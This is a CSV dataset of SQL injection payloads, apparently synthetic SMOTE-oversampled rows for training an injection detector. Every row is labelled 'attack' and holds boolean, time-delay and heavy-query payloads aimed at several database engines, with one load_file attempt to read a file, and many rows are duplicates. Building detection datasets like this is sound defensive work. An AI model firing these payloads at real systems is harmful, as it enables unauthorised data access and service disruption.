id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_001739,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000019,1.0588852411012604
SMOTE_001740,attack,boolean,"1  )   where 9687  =  9687 and elt  (  9607  =  9432,9432  )  --",nearest_attack_euclidean,R000126,0.5682035649040775
SMOTE_001741,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   7240  =  7240",nearest_attack_euclidean,R000007,0.9290899085639939
SMOTE_001742,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000062,0.25045629045758155
SMOTE_001743,attack,boolean,"1""  )   where 2839  =  2839 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000083,0.42729220945488244
SMOTE_001744,attack,boolean,"1  )   as iuje where 1976  =  1976 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",nearest_attack_euclidean,R000132,1.5442208392765868
SMOTE_001745,attack,boolean,"-6407'  )   or elt  (  1631  =  4946,4946  )   and   (  'jpnz'  =  'jpnz",nearest_attack_euclidean,R000073,1.183951814714279
SMOTE_001746,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000019,0.7782585772839328
SMOTE_001747,attack,boolean,"1  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7182  =  7182",nearest_attack_euclidean,R000145,0.3073737701749109
SMOTE_001748,attack,boolean,"1' in boolean mode  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000011,0.8472821532296134
SMOTE_001749,attack,boolean,"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000046,1.1591768856722748
SMOTE_001750,attack,boolean,"1""  )   as nqtn where 5606  =  5606 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000123,1.3883843509142373
SMOTE_001751,attack,boolean,"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000107,0.5808498671267193
SMOTE_001752,attack,boolean,"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qruf""  =  ""qruf",nearest_attack_euclidean,R000076,0.3533591265755187
SMOTE_001753,attack,boolean,"1' in boolean mode  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000011,0.17566654661923747
SMOTE_001754,attack,boolean,"1%""   )    )    and elt  (  7633  =  4110,4110  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000116,0.06951770258957178
SMOTE_001755,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000088,1.0987997961279057
SMOTE_001756,attack,boolean,"1%'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000112,0.005131883410194791
SMOTE_001757,attack,boolean,1%'   )    )    rlike   (  select   (  case when   (  6094  =  7893  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',nearest_attack_euclidean,R000130,0.8172546846091773
SMOTE_001758,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahjf'  =  'ahjf,nearest_attack_euclidean,R000156,0.7241877280943436
SMOTE_001759,attack,boolean,1   )    )    as fpej where 6790  =  6790 and   (  3020  =  3020  )  *6703--,nearest_attack_euclidean,R000138,0.9042968604084382
SMOTE_001760,attack,boolean,"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",nearest_attack_euclidean,R000029,0.865111400283348
SMOTE_001761,attack,boolean,"1%""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000014,0.7768789493700775
SMOTE_001762,attack,boolean,"1  )   as iuje where 1976  =  1976 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",nearest_attack_euclidean,R000132,0.547732045306307
SMOTE_001763,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000012,1.4968535416535182
SMOTE_001764,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000019,1.0684807490271426
SMOTE_001765,attack,boolean,"-3953  )   as wjjk where 6433  =  6433 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000114,0.40882613876018026
SMOTE_001766,attack,boolean,"1  )   as wxms where 7272  =  7272 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000051,1.261503753976714
SMOTE_001767,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'ootz' like 'ootz",nearest_attack_euclidean,R000108,0.27539919515254163
SMOTE_001768,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000019,0.21965651358756258
SMOTE_001769,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R000048,0.8557142181219907
SMOTE_001770,attack,boolean,"1  )   as ndgd where 2367  =  2367 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000033,1.0660480678485647
SMOTE_001771,attack,boolean,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,nearest_attack_euclidean,R000148,1.5107001321083078
SMOTE_001772,attack,boolean,1'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   'vvkd' like 'vvkd,nearest_attack_euclidean,R000154,0.10608877231509685
SMOTE_001773,attack,boolean,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ozan'  =  'ozan",nearest_attack_euclidean,R000084,1.35223392308731
SMOTE_001774,attack,boolean,"1'   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000015,0.18199512303844909
SMOTE_001775,attack,boolean,"1'  )   where 7007  =  7007 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000149,1.659055224801141
SMOTE_001776,attack,boolean,"1%' or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000134,0.3133881127698645
SMOTE_001777,attack,boolean,"1  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  5098  =  5098",nearest_attack_euclidean,R000022,0.4222137772888457
SMOTE_001778,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'osqf'  =  'osqf",nearest_attack_euclidean,R000121,0.11033567209851755
SMOTE_001779,attack,boolean,"1%""  )   and elt  (  7436  =  9874,9874  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000082,0.44069325695487255
SMOTE_001780,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'bhlx' like 'bhlx",nearest_attack_euclidean,R000070,0.6960978770317642
SMOTE_001781,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000150,0.6918189353419746
SMOTE_001782,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000040,1.307691842557144
SMOTE_001783,attack,boolean,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'vxqs'  =  'vxqs",nearest_attack_euclidean,R000024,0.40715230953243603
SMOTE_001784,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",nearest_attack_euclidean,R000036,1.3971143498931828
SMOTE_001785,attack,boolean,"1%'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000112,1.0708775477802785
SMOTE_001786,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'teng' like 'teng",nearest_attack_euclidean,R000039,2.213309899514587
SMOTE_001787,attack,boolean,"-3953  )   as wjjk where 6433  =  6433 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000114,0.4947974355341378
SMOTE_001788,attack,boolean,"1'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'novq'  =  'novq",nearest_attack_euclidean,R000063,0.4716386934291968
SMOTE_001789,attack,boolean,"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",nearest_attack_euclidean,R000029,2.03677359791677
SMOTE_001790,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000012,1.7313718180106787
SMOTE_001791,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000012,1.3860930745664772
SMOTE_001792,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'teng' like 'teng",nearest_attack_euclidean,R000039,2.065214993123758
SMOTE_001793,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000103,0.1738360428833538
SMOTE_001794,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp",nearest_attack_euclidean,R000118,2.1278534918130054
SMOTE_001795,attack,boolean,"1' where 2332  =  2332 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000025,0.16458228566989497
SMOTE_001796,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",nearest_attack_euclidean,R000111,0.30566578271384526
SMOTE_001797,attack,boolean,"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000016,0.7181176515955185
SMOTE_001798,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000146,0.9501821415167535
SMOTE_001799,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""jkfk""  =  ""jkfk",nearest_attack_euclidean,R000124,1.5471073863535276
SMOTE_001800,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000054,1.4751329501031527
SMOTE_001801,attack,boolean,"-3971%'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000020,0.7438863898625987
SMOTE_001802,attack,boolean,"-4641""  )   where 4212  =  4212 or make_set  (  3595  =  4062,4062  )  --",nearest_attack_euclidean,R000030,0.7939066025363828
SMOTE_001803,attack,boolean,"1  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000026,2.2983839253262186
SMOTE_001804,attack,boolean,"1  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000131,0.015479592706064573
SMOTE_001805,attack,boolean,select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000003,0.0013112764247618144
SMOTE_001806,attack,boolean,"1"" where 3018  =  3018 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000135,1.1171167189612345
SMOTE_001807,attack,boolean,"1'||  (  select 'xpjg' where 3036  =  3036 and elt  (  1832  =  6644,6644   )    )   ||'",nearest_attack_euclidean,R000061,0.23962596802064856
SMOTE_001808,attack,boolean,"1  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000067,0.6811810100612379
SMOTE_001809,attack,boolean,"-6890""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""ftho"" like ""ftho",nearest_attack_euclidean,R000105,2.4559968157553453
SMOTE_001810,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000059,1.0017322676856704
SMOTE_001811,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000040,0.9562790267423266
SMOTE_001812,attack,boolean,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000072,0.10968736031317251
SMOTE_001813,attack,boolean,"1""  )   as gtpi where 8100  =  8100 and make_set  (  2678  =  9169,9169  )  --",nearest_attack_euclidean,R000018,0.328594292086228
SMOTE_001814,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000150,0.9095399599657252
SMOTE_001815,attack,boolean,"1' in boolean mode  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000011,0.5364523019805328
SMOTE_001816,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000062,0.3339658222388582
SMOTE_001817,attack,boolean,-5067'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'vkab' like 'vkab,nearest_attack_euclidean,R000142,0.4957279319838641
SMOTE_001818,attack,boolean,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',nearest_attack_euclidean,R000077,1.6011323200308196
SMOTE_001819,attack,boolean,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ozan'  =  'ozan",nearest_attack_euclidean,R000084,0.7102677637498845
SMOTE_001820,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,nearest_attack_euclidean,R000104,4.8935029337809475
SMOTE_001821,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000088,0.5760831930181675
SMOTE_001822,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000128,0.9665813799126111
SMOTE_001823,attack,boolean,"1'  )   where 7007  =  7007 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000149,0.07940912292928813
SMOTE_001824,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000078,0.19723283995355625
SMOTE_001825,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""jkfk""  =  ""jkfk",nearest_attack_euclidean,R000124,1.1466003971764183
SMOTE_001826,attack,boolean,"1'   )    )    as vqrt where 5173  =  5173 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000092,0.19760478586449906
SMOTE_001827,attack,boolean,"1  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000131,1.3558041849128943
SMOTE_001828,attack,boolean,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,nearest_attack_euclidean,R000148,0.6995822968245273
SMOTE_001829,attack,boolean,"1"" where 2072  =  2072 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000133,1.0964936977210735
SMOTE_001830,attack,boolean,"1""   )    )    as sqzh where 5672  =  5672 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000155,0.3789540440359674
SMOTE_001831,attack,boolean,"1""   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""vypw"" like ""vypw",nearest_attack_euclidean,R000058,1.5788503184663056
SMOTE_001832,attack,boolean,"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000046,1.9583483070273031
SMOTE_001833,attack,boolean,"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qruf""  =  ""qruf",nearest_attack_euclidean,R000076,2.0131129828692442
SMOTE_001834,attack,boolean,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps",nearest_attack_euclidean,R000035,1.1891977680899601
SMOTE_001835,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000059,0.5216806144026341
SMOTE_001836,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",nearest_attack_euclidean,R000036,1.1965055611871882
SMOTE_001837,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000086,2.029371458115186
SMOTE_001838,attack,boolean,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000013,0.18666633490813433
SMOTE_001839,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000005,2.657225002069969
SMOTE_001840,attack,boolean,"1""   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""vypw"" like ""vypw",nearest_attack_euclidean,R000058,0.412741409966437
SMOTE_001841,attack,boolean,1'  )   where 3767  =  3767 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R000152,0.5579146765821361
SMOTE_001842,attack,boolean,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,nearest_attack_euclidean,R000148,0.36604132665814815
SMOTE_001843,attack,boolean,"1  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000067,0.5438056169956309
SMOTE_001844,attack,boolean,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000144,0.3298148565104497
SMOTE_001845,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""rkvr""  =  ""rkvr",nearest_attack_euclidean,R000049,2.102987339083085
SMOTE_001846,attack,boolean,"-4641""  )   where 4212  =  4212 or make_set  (  3595  =  4062,4062  )  --",nearest_attack_euclidean,R000030,0.988858594621718
SMOTE_001847,attack,boolean,"-3971%'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000020,0.03499721056651868
SMOTE_001848,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000052,1.889804986371171
SMOTE_001849,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000019,1.6843352832584173
SMOTE_001850,attack,boolean,"1' in boolean mode  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000011,0.8973799685337417
SMOTE_001851,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000150,0.06153077650873752
SMOTE_001852,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000052,0.5195323916037234
SMOTE_001853,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000150,0.6751227772811489
SMOTE_001854,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",nearest_attack_euclidean,R000036,0.47136676666589605
SMOTE_001855,attack,boolean,"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""rzja"" like ""rzja",nearest_attack_euclidean,R000097,2.144698368333849
SMOTE_001856,attack,boolean,select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000003,2.365054873105024
SMOTE_001857,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000040,0.2953114267947195
SMOTE_001858,attack,boolean,"-5904"" where 9782  =  9782 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",nearest_attack_euclidean,R000079,1.8215445632829441
SMOTE_001859,attack,boolean,"1""  )   as yecj where 1194  =  1194 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000037,1.1175364933862628
SMOTE_001860,attack,boolean,"1"" or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""jtgs"" like ""jtgs",nearest_attack_euclidean,R000074,2.2627970291939095
SMOTE_001861,attack,boolean,"1  )   where 9687  =  9687 and elt  (  9607  =  9432,9432  )  --",nearest_attack_euclidean,R000126,1.061156621095211
SMOTE_001862,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp",nearest_attack_euclidean,R000118,0.17271561140961034
SMOTE_001863,attack,boolean,"1%'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000069,0.4698426791408322
SMOTE_001864,attack,boolean,"1 where 3175  =  3175 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000106,0.3967603557021014
SMOTE_001865,attack,boolean,select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,nearest_attack_euclidean,R000001,0.43643266364916644
SMOTE_001866,attack,boolean,"1""  )   as gtpi where 8100  =  8100 and make_set  (  2678  =  9169,9169  )  --",nearest_attack_euclidean,R000018,0.8916202515317855
SMOTE_001867,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000078,0.9080393951397221
SMOTE_001868,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",nearest_attack_euclidean,R000115,0.9137329437131834
SMOTE_001869,attack,boolean,"-4889""   )    )    as vvuo where 8060  =  8060 or   (  8459  =  8459  )  *4906--",nearest_attack_euclidean,R000056,0.7302129242996461
SMOTE_001870,attack,boolean,"1 where 3175  =  3175 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000106,0.7745288070095213
SMOTE_001871,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahjf'  =  'ahjf,nearest_attack_euclidean,R000156,0.3802642524436999
SMOTE_001872,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000103,0.7871818445370361
